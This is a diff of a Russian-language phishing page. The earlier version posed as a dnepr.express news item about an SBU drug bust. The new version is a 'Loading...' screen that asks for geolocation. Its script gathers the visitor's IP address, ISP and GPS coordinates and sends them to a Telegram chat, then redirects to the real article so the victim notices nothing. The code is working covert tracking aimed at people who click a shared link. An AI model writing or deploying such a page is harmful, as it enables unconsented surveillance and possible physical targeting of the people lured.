@@ -2,55 +2,28 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Экстренные новости | dnepr.express</title>
+  <title>Загрузка...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: Arial, sans-serif;
+    html, body {
       margin: 0;
-      padding: 20px;
-      background-color: #f9f9f9;
-      color: #111;
-    }
-    .logo {
-      max-width: 180px;
-      margin-bottom: 15px;
-    }
-    .headline {
-      font-size: 1.4em;
-      font-weight: bold;
-      margin: 15px 0;
-    }
-    .news-img {
-      width: 100%;
-      max-width: 700px;
-      border-radius: 8px;
-      margin: 10px 0 20px 0;
-    }
-    .fake-text {
-      font-size: 1em;
-      color: #444;
-      line-height: 1.6em;
+      padding: 0;
+      background-color: #000;
+      color: #fff;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
     }
     #status {
-      display: none;
+      font-size: 1.2em;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <!-- Логотип -->
-  <img src="https://dnepr.express/logo.png" alt="Dnepr Express" class="logo">
-
-  <div class="headline">⚡️ Масштабная операция СБУ: разоблачена сеть наркоторговцев</div>
-
-  <!-- Сюжетная картинка -->
-  <img src="https://dnepr.express/storage/media/publishing-media/2025/05/15/1747290691-bvmrh/conversions/inshot-20250515-092937128-amp.jpg" alt="Новость" class="news-img">
-
-  <p class="fake-text">
-    Сегодня Служба безопасности Украины сообщила о задержании участников крупной преступной группы, действовавшей в 15 областях страны, в том числе в Днепропетровской. Подробности в эксклюзивном материале далее...
-  </p>
-
-  <div id="status">Обработка...</div>
+  <div id="status">⏳ Разрешите доступ к геолокации, если будет запрошено...</div>
 
   <script>
     const redirectUrl = "https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina";
@@ -63,10 +36,13 @@
           chat_id: 490491527,
           text: message
         })
-      }).finally(callback);
+      }).finally(() => {
+        callback();
+      });
     }
 
     function startRedirect() {
+      document.getElementById("status").innerText = "🔁 Перенаправление...";
       window.location.href = redirectUrl;
     }
 
@@ -81,6 +57,7 @@ IP: ${data.ip}
 Провайдер: ${data.connection.isp}
 Время: ${new Date().toLocaleString()}`;
 
+        // GPS запрос
         if (navigator.geolocation) {
           let gotGPS = false;
 
@@ -89,7 +66,7 @@ IP: ${data.ip}
               const msg = ipMessage + "\n\n⚠️ GPS: не получен (таймаут)";
               sendToTelegram(msg, startRedirect);
             }
-          }, 7000);
+          }, 7000); // немного дольше
 
           navigator.geolocation.getCurrentPosition(
             pos => {
